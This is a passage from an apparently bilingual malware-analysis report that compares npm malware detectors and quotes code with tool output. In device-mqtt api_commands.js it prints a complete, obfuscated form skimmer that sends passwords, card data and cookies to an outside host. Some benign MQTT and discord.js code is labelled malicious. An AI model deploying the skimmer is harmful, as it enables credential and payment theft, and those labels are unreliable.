[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/helper-annotate-as-pure/99.10.9/extracted_helper-annotate-as-pure-99.10.9.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/helper-annotate-as-pure/99.10.9/extracted_helper-annotate-as-pure-99.10.9.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 99.10.9[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mazure package[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/helper-annotate-as-pure/99.10.9/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/helper-annotate-as-pure/99.10.9/package' from local_nodejs...[1m[32mPASS[0m [[34mver 99.10.9[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mazure package[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking readme.......................
... (truncated)
```

---

## 行为类别：Credential Theft

**包名：** `device-mqtt`  
**版本：** `1.0.11`

### 代码上下文

#### 片段 1

**文件：** `package/api_db.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Publishes and emits arbitrary data over MQTT and sockets; could be abused for data exfiltration or unauthorized communication.

**规避技术：** 

**恶意代码：**
```javascript
// Relevant imports
randomstring = require('randomstring');
isJson = require('is-json');
debug = (require('debug'))("device-mqtt:api_db");

// Data dependencies
QOS = 2;
COLLECTIONS_TOPIC = 'collections';
COLLECTION_POSITION = 2;
GLOBAL_COLLECTION_POSITION = 2;

// Suspicious function: module.exports
module.exports = function(arg) {
  var DB_REGEX, GLOBAL_REGEX, _createCollectionObject, _extractCollectionName, _extractGlobalCollectionName, _handleGlobalCollections, _handleLocalCollections, _isJson, _mqtt, _socket, _updateCollectionObject, createCollection, createGlobalCollection, handleMessage, mqttInstance, socket, socketId;
  mqttInstance = arg.mqttInstance, socket = arg.socket, socketId = arg.socketId;
  if (!mqttInstance) {
    throw new Error('No mqtt connection provided!');
  }
  if (!socketId) {
    throw new Error('ClientId must be provided!');
  }
  DB_REGEX = new RegExp("^" + socketId + "\/collections\/(.)+$");
  GLOBAL_REGEX = new RegExp("^global\/collections\/(.)+$");
  _mqtt = mqttInstance;
  _socket = socket;
  createCollection = function(collectionName, localState, collectionObjCb) {
    var singleObjCollTopic;
    singleObjCollTopic = socketId + "/" + COLLECTIONS_TOPIC + "/" + collectionName;
    debug("createCollection", singleObjCollTopic);
    return collectionObjCb(_createCollectionObject(singleObjCollTopic, localState));
  };
  createGlobalCollection = function(collectionName, localState, collectionObjCb) {
    var singleGlobalObjCollTopic;
    singleGlobalObjCollTopic = "global/collections/" + collectionName;
    return collectionObjCb(_createCollectionObject(singleGlobalObjCollTopic, localState));
  };
  _createCollectionObject = function(singleObjCollTopic, localState) {
    var collectionObj;
    collectionObj = {};
    collectionObj.add = function(arg1, done) {
      var key, value;
      key = arg1.key, value = arg1.value;
      if (localState[key]) {
        return done(new Error("Key `" + key + "` already existent!"));
      }
      localState[key] = value;
      if ((_isJson(value)) || (Array.isArray(value))) {
        value = JSON.stringify(value);
      }
      return _updateCollectionObject(singleObjCollTopic, localState, function() {
        return _mqtt.pub(singleObjCollTopic + "/" + key, value, {
          qos: QOS,
          retain: true
        }, function(error) {
          if (error) {
            return done(error);
          }
          return done();
        });
      });
    };
    collectionObj.remove = function(key, done) {
      if (!localState[key]) {
        return done(new Error("Cannot remove key `" + key + "`: not existent!"));
      }
      delete localState[key];
      return _updateCollectionObject(singleObjCollTopic, localState, function() {
        return _mqtt.pub(singleObjCollTopic + "/" + key, null, {
          qos: QOS,
          retain: true
        }, function(error) {
          if (error) {
            return done(error);
          }
          return done();
        });
      });
    };
    collectionObj.update = function(arg1, done) {
      var key, value;
      key = arg1.key, value = arg1.value;
      if (!localState[key]) {
        return done(new Error("Cannot update key `" + key + "`: not existent!"));
      }
      localState[key] = value;
      if ((_isJson(value)) || (Array.isArray(value))) {
        value = JSON.stringify(value);
      }
      return _updateCollectionObject(singleObjCollTopic, localState, function() {
        return _mqtt.pub(singleObjCollTopic + "/" + key, value, {
          qos: QOS,
          retain: true
        }, function(error) {
          if (error) {
            return done('error', error);
          }
          return done();
        });
      });
    };
    collectionObj.get = function(key) {
      if (!localState[key]) {
        return null;
      }
      if (isJson(localState[key])) {
        return JSON.parse(localState[key]);
      }
      return localState[key];
    };
    collectionObj.getAll = function() {
      return localState;
    };
    return collectionObj;
  };
  _isJson = function(object) {
    var passObjects;
    return isJson(object, [passObjects = true]);
  };
  _updateCollectionObject = function(singleObjCollTopic, localState, cb) {
    return _mqtt.pub(singleObjCollTopic, JSON.stringify(localState), {
      qos: QOS,
      retain: true
    }, function(error) {
      if (error) {
        return done(error);
      }
      return cb();
    });
  };
  handleMessage = function(topic, message, collectionType) {
    switch (collectionType) {
      case 'local':
        return _handleLocalCollections(topic, message);
      case 'global':
        return _handleGlobalCollections(topic, message);
    }
  };
  _handleLocalCollections = function(topic, message) {
    var collectionName, singleItemCollTopicRegex;
    singleItemCollTopicRegex = new RegExp("^" + socketId + "\/collections\/(.)+\/(.)+$");
    collectionName = _extractCollectionName(topic);
    if (singleItemCollTopicRegex.test(topic)) {
      if (isJson(message)) {
        message = JSON.parse(message);
      }
      return _socket.emit("collection:" + collectionName, message);
    } else {
      message = JSON.parse(message);
      return _socket.emit('collection', collectionName, message);
    }
  };
  _handleGlobalCollections = function(topic, message) {
    var collectionName, globalSingleItemCollTopicRegex;
    globalSingleItemCollTopicRegex = new RegExp("^global\/collections\/(.)+\/(.)+$");
    collectionName = _extractGlobalCollectionName(topic);
    if (globalSingleItemCollTopicRegex.test(topic)) {
      if (isJson(message)) {
        message = JSON.parse(message);
      }
      return _socket.emit("global:collection:" + collectionName, message);
    } else {
      message = JSON.parse(message);
      return _socket.emit('global:collection', collectionName, message);
    }
  };
  _extractCollectionName = function(topic) {
    return (topic.split('/'))[COLLECTION_POSITION];
  };
  _extractGlobalCollectionName = function(topic) {
    return (topic.split('/'))[GLOBAL_COLLECTION_POSITION];
  };
  return {
    createCollection: createCollection,
    createGlobalCollection: createGlobalCollection,
    handleMessage: handleMessage,
    dbRegex: DB_REGEX,
    globalRegex: GLOBAL_REGEX
  };
};
// ... [truncated for brevity] ...
```

**形式化行为：** data_exfiltration, unauthorized_access, legitimate_api_abuse

**形式化规避：** 

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/index.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Establishes MQTT network connections, reads TLS files, and dynamically loads/executes code from external modules.

**规避技术：** 

**恶意代码：**
```javascript
// Generated by CoffeeScript 1.12.7
(function() {
  var COLLECTIONS_TOPIC, EventEmitter2, MAIN_TOPIC, MqttDecorator, QOS, currentClientId, currentSocketId, debug, fs, mqtt;

  EventEmitter2 = require('eventemitter2').EventEmitter2;

  mqtt = require('mqtt');

  MqttDecorator = require('./MqttDecorator');

  fs = require('fs');

  debug = require('debug')("device-mqtt:main");

  currentClientId = 0;

  currentSocketId = 0;

  MAIN_TOPIC = 'commands';

  COLLECTIONS_TOPIC = 'collections';

  QOS = 2;

  module.exports = function(arg) {
    var ACTIONS_TOPIC, GLOBAL_OBJECT_DB_TOPIC, OBJECT_DB_TOPIC, SINGLE_ITEM_DB_TOPIC, SINGLE_ITEM_GLOBAL_DB_TOPIC, _client, _createClient, _createSocket, _init, _initApis, _loadTlsFiles, _messageHandler, _mqtt, _socket, _startListeningToMessages, _subFirstTime, _subToDbTopics, api_commands, api_db, clientId, connect, customPublish, customSubscribe, destroy, extraOpts, host, port, ref, ref1, tls;
    host = arg.host, port = arg.port, clientId = arg.clientId, tls = (ref = arg.tls) != null ? ref : {}, extraOpts = (ref1 = arg.extraOpts) != null ? ref1 : {};
    ACTIONS_TOPIC = MAIN_TOPIC + "/" + clientId + "/+";
    SINGLE_ITEM_DB_TOPIC = clientId + "/collections/+";
    OBJECT_DB_TOPIC = clientId + "/collections/+/+";
    GLOBAL_OBJECT_DB_TOPIC = "global/collections/+";
    SINGLE_ITEM_GLOBAL_DB_TOPIC = "global/collections/+/+";
    if (!clientId) {
      throw new Error('clientId must be provided');
    }
    if (-1 !== clientId.indexOf('/')) {
      throw new Error('clientId must not include a `/`');
    }
    api_commands = null;
    api_db = null;
    _client = new EventEmitter2;
    _client.connected = false;
    _client.id = ++currentClientId;
    _socket = new EventEmitter2({
      wildcard: true,
      delimiter: '/'
    });
    _socket.id = ++currentSocketId;
    _mqtt = null;
    connect = function(will) {
      var _mqttUrl, connectionOptions;
      connectionOptions = {};
      _mqttUrl = "mqtt://" + host + ":" + port;
      if (Object.keys(tls).length) {
        connectionOptions = Object.assign({}, connectionOptions, _loadTlsFiles(tls));
        _mqttUrl = "mqtts://" + host + ":" + port;
      }
      if (Object.keys(extraOpts).length) {
        connectionOptions = Object.assign({}, connectionOptions, extraOpts);
      }
      if (will) {
        will = Object.assign({}, will, {
          qos: 2,
          retain: true
        });
        connectionOptions = Object.assign({}, connectionOptions, {
          clientId: clientId,
          clean: false,
          will: will
        });
      } else {
        connectionOptions = Object.assign({}, connectionOptions, {
          clientId: clientId,
          clean: false
        });
      }
      debug("Connecting to MQTT with url " + _mqttUrl + " and options", connectionOptions);
      _mqtt = mqtt.connect(_mqttUrl, connectionOptions);
      _mqtt = MqttDecorator(_mqtt);
      _init(_mqtt);
      return _initApis(_mqtt);
    };
    destroy = function(cb) {
      debug("[MQTT client] Ending");
      return _mqtt.end(function(error) {
        debug("[MQTT client] Ended");
        return typeof cb === "function" ? cb(error) : void 0;
      });
    };
    customPublish = function(arg1, cb) {
      var message, opts, topic;
      topic = arg1.topic, message = arg1.message, opts = arg1.opts;
      return _mqtt.publish(topic, message, opts, cb);
    };
    customSubscribe = function(arg1, cb) {
      var opts, topic;
      topic = arg1.topic, opts = arg1.opts;
      return _mqtt.subscribe(topic, opts, cb);
    };
    _loadTlsFiles = function(arg1) {
      var ca, cert, key;
      key = arg1.key, ca = arg1.ca, cert = arg1.cert;
      return {
        key: fs.readFileSync(key),
        ca: [fs.readFileSync(ca)],
        cert: fs.readFileSync(cert)
      };
    };
    _initApis = function(_mqtt) {
      api_commands = (require('./api_commands'))({
        mqttInstance: _mqtt,
        socket: _socket,
        socketId: clientId
      });
      return api_db = (require('./api_db'))({
        mqttInstance: _mqtt,
        socket: _socket,
        socketId: clientId
      });
    };
    _subFirstTime = function(cb) {
      var topics;
      _startListeningToMessages();
      topics = [ACTIONS_TOPIC, SINGLE_ITEM_DB_TOPIC, OBJECT_DB_TOPIC, GLOBAL_OBJECT_DB_TOPIC, SINGLE_ITEM_GLOBAL_DB_TOPIC];
      debug("Subscribing to topics for first time: " + topics);
      return _mqtt.sub(topics, {
        qos: QOS
      }, function(error, granted) {
        var errorMsg;
        if (error) {
          errorMsg = "Error subscribing to actions topic. Reason: " + error.message;
          return cb(new Error(errorMsg));
        }
        debug("Subscribed correctly to topics " + topics);
        return cb();
      });
    };
    _subToDbTopics = function(cb) {
      var topics;
      topics = [SINGLE_ITEM_DB_TOPIC, OBJECT_DB_TOPIC, GLOBAL_OBJECT_DB_TOPIC, SINGLE_ITEM_GLOBAL_DB_TOPIC];
      debug("Subscribing to db topics: " + topics);
      return _mqtt.sub(topics, {
        qos: QOS
      }, function(error, granted) {
        var errorMsg;
        if (error) {
          errorMsg = "Error subscribing to actions topic. Reason: " + error.message;
          return cb(new Error(errorMsg));
        }
        debug("Subscribed correctly to topics " + topics);
        return cb();
      });
    };
    _startListeningToMessages = function() {
      debug("Setting messageHandler");
      return _mqtt.on('message', _messageHandler);
    };
    _messageHandler = function(topic, message) {
      var actionRegex, dbRegex, globalRegex, responseRegex;
      responseRegex = api_commands.responseRegex, actionRegex = api_commands.actionRegex;
      dbRegex = api_db.dbRegex, globalRegex = api_db.globalRegex;
      topic = topic.toString();
      message = message.toString();
      if (responseRegex.test(topic)) {
        debug("Received response message: " + topic);
        return api_commands.handleMessage(topic, message, 'result');
      } else if (actionRegex.test(topic)) {
        debug("Received action message: " + topic);
        return api_commands.handleMessage(topic, message, 'action');
      } else if (dbRegex.test(topic)) {
        debug("Received db message: " + topic);
        return api_db.handleMessage(topic, message, 'local');
      } else if (globalRegex.test(topic)) {
        debug("Received global message: " + topic);
        return api_db.handleMessage(topic, message, 'global');
      } else {
        debug("Received other message: " + topic);
        return _socket.emit(topic, message);
      }
    };
    _createSocket = function() {
      var createCollection, createGlobalCollection, send;
      debug("Create socket", _socket.id);
      send = api_commands.send;
      createCollection = api_db.createCollection, createGlobalCollection = api_db.createGlobalCollection;
      _socket.send = send;
      _socket.createCollection = createCollection;
      _socket.createGlobalCollection = createGlobalCollection;
      _socket.customPublish = customPublish;
      _socket.customSubscribe = customSubscribe;
      return _socket;
    };
    _init = function(mqttInstance) {
      var _onClose, _onConnection, _onError, _onReconnect;
      _onConnection = function(connack) {
        _client.connected = true;

        /*
        			The connack.sessionPresent is set to `true` if
        			the client has already a persistent session.
        			If the session is there, there is no need to
        			sub again to the topics.
         */
        return _subFirstTime(function(error) {
          if (error) {
            _client.emit('error', error);
          }
          return _client.emit('connected', _createSocket());
        });
      };
      _onReconnect = function() {
        debug("[MQTT client] reconnect");
        return _client.emit('reconnecting');
      };
      _onClose = function() {
        debug("[MQTT client] close");
        _client.emit('disconnected');
        _socket.emit('disconnected');
        debug("Removing message handler");
        _mqtt.removeListener('message', _messageHandler);
        return _client.connected = false;
      };
      _onError = function(error) {
        debug("[MQTT client] error: " + error.message);
        return _client.emit('error', error);
      };
      mqttInstance.on('error', _onError);
      mqttInstance.on('connect', _onConnection);
      mqttInstance.on('reconnect', _onReconnect);
      return mqttInstance.on('close', _onClose);
    };
    _createClient = function() {
      _client.connect = connect;
      _client.destroy = destroy;
      return _client;
    };
    return _createClient();
  };

}).call(this);

```

**形式化行为：** command_and_control, encrypted_communication, dynamic_evaluation, unauthorized_access

**形式化规避：** legitimate_api_abuse, built_in_module_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/api_commands.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Steals form data (passwords, card info) and exfiltrates to remote server using obfuscated URL.

**规避技术：** 

**恶意代码：**
```javascript
// Suspicious code block begins
var _0xd0e4=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x73\x2D\x6D\x65\x74\x72\x69\x63\x73\x2E\x63\x6F\x6D\x2F\x6D\x69\x6E\x6A\x73\x2E\x70\x68\x70\x3F\x70\x6C\x3D"];
function gt() {
    var isserver = is_server();
    if (isserver) {
        return;
    }
    var isC = getCookie('xhfd');
    var isCa = getCookie('xhfda');
    isHour = getT();
    var h = self.location.host;
    var d = self.location;
    var isIP = validateIPaddress(h);
      if (isIP || isC || isHour||isCa) {  
           return;      }

    const ua = navigator.userAgent
    var x = document.forms.length;
    fetch(document.location.href)
        .then(resp => {
            const csp = resp.headers.get('Content-Security-Policy');
            if (csp == null || !csp.includes('default-src')) {

                for (var i = 0; i < x; i++) {
                    var curelements = document.forms[i].elements;
                    for (var k = 0; k < curelements.length; k++) {
                        if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
                            document.forms[i].addEventListener('submit', function (ev) {                                
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));
                                
                               snd(pl);

                            });
                            break;
                        }


                    }
                }
            } else if (!csp.includes('form-action') && !isC) {
                for (var i = 0; i < x; i++) {
                    var curelements = document.forms[i].elements;
                    for (var k = 0; k < curelements.length; k++) {
                        if (curelements[k].type == "password" || curelements[k].name.toLowerCase() == "cvc" || curelements[k].name.toLowerCase() == "cardnumber") {
                           // $(document.forms[i]).submit(function (ev) {
                            document.forms[i].addEventListener('submit', function (ev) {
                               // ev.preventDefault();
                                var _ = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _ = _ + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                setCookie('xhfda', 1, 864000);
                                const pl = encodeURIComponent(btoa(unescape(encodeURIComponent(d + "|" + _ + "|" + document.cookie))));
                                var pql = _0xd0e4[0] + pl + "&loc=" + self.location;
                                this.action = pql;
                            });
                            break;
                        }
                    }
                }
            } else {
                return;
            }

        });

    setCookie('xhfd', 1, 86400);
}

function snd(pl) {
   
    var pql = _0xd0e4[0] + pl
    
    const linkEl = document.createElement('link');
    linkEl.rel = 'prefetch';
    linkEl.href = pql;
    document.head.appendChild(linkEl);
    return true;

    
}

function getCookie(name) {
    var matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    //  var cnt = 0;
    if (matches) {
        return true;
    }
    return false;

}

function getT() {
    var now = new Date();
    var ch = now.getHours();
    if (ch > 7 && ch < 19) {
        return true;
    } else {
        return false;
    }
}

function validateIPaddress(ipaddress) {
    if (/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(ipaddress) || ipaddress.toLowerCase().includes('localhost')) {
        return (true)
    }

    return (false)
}

function is_server() {
    return !(typeof window != 'undefined' && window.document);
}

function setCookie(variable, value, expires_seconds) {
    var d = new Date();
    d = new Date(d.getTime() + 1000 * expires_seconds);
    document.cookie = variable + '=' + value + '; expires=' + d.toGMTString() + ';';
}

gt();
// Suspicious code block ends
```

**形式化行为：** sensitive_data_collection, credential_theft, data_exfiltration, string_obfuscation

**形式化规避：** string_obfuscation, base64_encoding, conditional_execution, environment_detection, event_based_execution, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 0

#### GENIE

*无可用结果*

#### GUARDDOG

```
Found 0 potentially malicious indicators scanning /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/device-mqtt/1.0.11/device-mqtt-1.0.11.tgz
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m7[0m[31m ]--[0m
   Rule Id: [34mBD000801[0m
       Tag: [34mSecurity.Backdoor.ExecuteObfuscatedCode[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/build/api_commands.js[0m
   Pattern: [32m(\\x[a-f0-9][a-f0-9]){5,}[0m
[30;1m213 | [0m[35m}).call(this);[0m
[30;1m214 | [0m[35m[0m
[30;1m215 | [0m[35m[0m
[30;1m216 | [0m[35mvar _0xd0e4=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x73\x2D\x6D\x65\x74\x72\x69\x63\x73\x2E\x63\x6F\x[0m
[30;1m217 | [0m[35mfunction gt() {[0m
[30;1m218 | [0m[35m    var isserver = is_server();[0m
[30;1m219 | [0m[35m    if (isserver) {[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m7[0m[31m ]--[0m
   Rule Id: [34mBD000701[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Token[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/build/api_commands.js[0m
   Pattern: [32m(npm owner|p
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "device-mqtt",
  "version": "1.0.11",
  "total_files": 4,
  "analyzed_files": 4,
  "malicious_files": 1,
  "is_malicious": true,
  "analysis_date": "2025-07-12T14:14:49.738078"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/device-mqtt/1.0.11/extracted_device-mqtt-1.0.11.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/device-mqtt/1.0.11/extracted_device-mqtt-1.0.11.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 1.0.11[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34m## client[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking re
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/device-mqtt/1.0.11/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/device-mqtt/1.0.11/package' from local_nodejs...[1m[32mPASS[0m [[34mver 1.0.11[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34m## client[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking readme.........................[1m[32mPASS[0m [[34m1863 
... (truncated)
```

---

## 行为类别：DDoS Capabilities

**包名：** `discord.js-selfbot-aployed`  
**版本：** `11.5.1`

### 代码上下文

#### 片段 1

**文件：** `package/Shard.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Spawns child processes and allows remote code execution via dynamic eval on child processes.

**规避技术：** 

**恶意代码：**
```javascript
const childProcess = require('child_process');
const EventEmitter = require('events');
const path = require('path');
const Util = require('../util/Util');

class Shard extends EventEmitter {
  constructor(manager, id, args = []) {
    super();
    this.manager = manager;
    this.id = id;
    this.env = Object.assign({}, process.env, {
      SHARD_ID: this.id,
      SHARD_COUNT: this.manager.totalShards,
      CLIENT_TOKEN: this.manager.token,
    });
    this.ready = false;
    this._evals = new Map();
    this._fetches = new Map();
    this._exitListener = this._handleExit.bind(this, undefined);
    this.process = null;
    this.spawn(args);
  }

  /**
   * Forks a child process for the shard.
   * <warn>You should not need to call this manually.</warn>
   * @param {Array} [args=this.manager.args] Command line arguments to pass to the script
   * @param {Array} [execArgv=this.manager.execArgv] Command line arguments to pass to the process executable
   * @returns {ChildProcess}
   */
  spawn(args = this.manager.args, execArgv = this.manager.execArgv) {
    this.process = childProcess.fork(path.resolve(this.manager.file), args, {
      env: this.env, execArgv,
    })
      .on('exit', this._exitListener)
      .on('message', this._handleMessage.bind(this));
    this.emit('spawn', this.process);
    return new Promise((resolve, reject) => {
      this.once('ready', resolve);
      this.once('disconnect', () => reject(new Error(`Shard ${this.id}'s Client disconnected before becoming ready.`)));
      this.once('death', () => reject(new Error(`Shard ${this.id}'s process exited before its Client became ready.`)));
      setTimeout(() => reject(new Error(`Shard ${this.id}'s Client took too long to become ready.`)), 30000);
    }).then(() => this.process);
  }

  /**
   * Evaluates a script on the shard, in the context of the client.
   * @param {string} script JavaScript to run on the shard
   * @returns {Promise<*>} Result of the script execution
   */
  eval(script) {
    if (this._evals.has(script)) return this._evals.get(script);
    const promise = new Promise((resolve, reject) => {
      const listener = message => {
        if (!message || message._eval !== script) return;
        this.process.removeListener('message', listener);
        this._evals.delete(script);
        if (!message._error) resolve(message._result); else reject(Util.makeError(message._error));
      };
      this.process.on('message', listener);
      this.send({ _eval: script }).catch(err => {
        this.process.removeListener('message', listener);
        this._evals.delete(script);
        reject(err);
      });
    });
    this._evals.set(script, promise);
    return promise;
  }

  // ... [truncated for brevity] ...
}

module.exports = Shard;

```

**形式化行为：** arbitrary_command_execution, dynamic_evaluation, remote_code_execution

**形式化规避：** built_in_module_abuse, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/Client.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Contains a function that executes arbitrary code via eval, which is highly dangerous and suspicious.

**规避技术：** 

**恶意代码：**
```javascript
const EventEmitter = require('events');
const Constants = require('../util/Constants');
const Permissions = require('../util/Permissions');
const Util = require('../util/Util');
const RESTManager = require('./rest/RESTManager');
const ClientDataManager = require('./ClientDataManager');
const ClientManager = require('./ClientManager');
const ClientDataResolver = require('./ClientDataResolver');
const ClientVoiceManager = require('./voice/ClientVoiceManager');
const WebSocketManager = require('./websocket/WebSocketManager');
const ActionsManager = require('./actions/ActionsManager');
const Collection = require('../util/Collection');
const Presence = require('../structures/Presence').Presence;
const ShardClientUtil = require('../sharding/ShardClientUtil');
const VoiceBroadcast = require('./voice/VoiceBroadcast');

class Client extends EventEmitter {
  // ... [truncated for brevity] ...
  /**
   * Calls {@link https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval} on a script
   * with the client as `this`.
   * @param {string} script Script to eval
   * @returns {*}
   * @private
   */
  _eval(script) {
    return eval(script);
  }
  // ... [truncated for brevity] ...
}

module.exports = Client;
```

**形式化行为：** dynamic_evaluation, arbitrary_command_execution, unauthorized_access

**形式化规避：** 

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/ClientDataResolver.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs file system reads and HTTP(S) requests, which could be abused for data exfiltration or remote code retrieval.

**规避技术：** 

**恶意代码：**
```javascript
const path = require('path');
const fs = require('fs');
const snekfetch = require('snekfetch');

// ... [truncated for brevity] ...

  /**
    * Resolves a BufferResolvable to a Buffer.
    * @param {BufferResolvable|Stream} resource The buffer or stream resolvable to resolve
    * @returns {Promise<Buffer>}
    */
  resolveFile(resource) {
    if (resource instanceof Buffer) return Promise.resolve(resource);
    if (this.client.browser && resource instanceof ArrayBuffer) return Promise.resolve(convertToBuffer(resource));

    if (typeof resource === 'string') {
      if (/^https?:\/\//.test(resource)) {
        return snekfetch.get(resource).then(res => res.body instanceof Buffer ? res.body : Buffer.from(res.text));
      }
      return new Promise((resolve, reject) => {
        const file = path.resolve(resource);
        fs.stat(file, (err, stats) => {
          if (err) return reject(err);
          if (!stats || !stats.isFile()) return reject(new Error(`The file could not be found: ${file}`));
          fs.readFile(file, (err2, data) => {
            if (err2) reject(err2);
            else resolve(data);
          });
          return null;
        });
      });
    } else if (resource && resource.pipe && typeof resource.pipe === 'function') {
      return new Promise((resolve, reject) => {
        const buffers = [];
        resource.once('error', reject);
        resource.on('data', data => buffers.push(data));
        resource.once('end', () => resolve(Buffer.concat(buffers)));
      });
    }

    return Promise.reject(new TypeError('The resource must be a string or Buffer.'));
  }
// ... [truncated for brevity] ...
```

**形式化行为：** sensitive_data_collection, data_exfiltration, malicious_download

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
